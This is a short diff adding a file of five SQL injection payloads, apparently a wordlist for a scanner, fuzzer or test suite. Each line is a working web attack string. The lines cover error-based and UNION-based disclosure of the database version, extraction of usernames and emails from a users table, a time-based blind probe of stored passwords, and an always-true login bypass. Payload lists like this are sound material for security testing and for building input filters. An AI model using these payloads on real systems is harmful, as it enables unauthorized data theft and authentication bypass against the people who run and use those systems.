@@ -1,0 +1,5 @@
+' OR 1=CONVERT(int,@@version)--
+' UNION SELECT 1,@@version--
+' UNION SELECT id,username,email FROM users--
+' AND IF((SELECT SUBSTR(password,1,1) FROM users WHERE id=1)='a', SLEEP(5), 0)--
+' OR 'a'='a
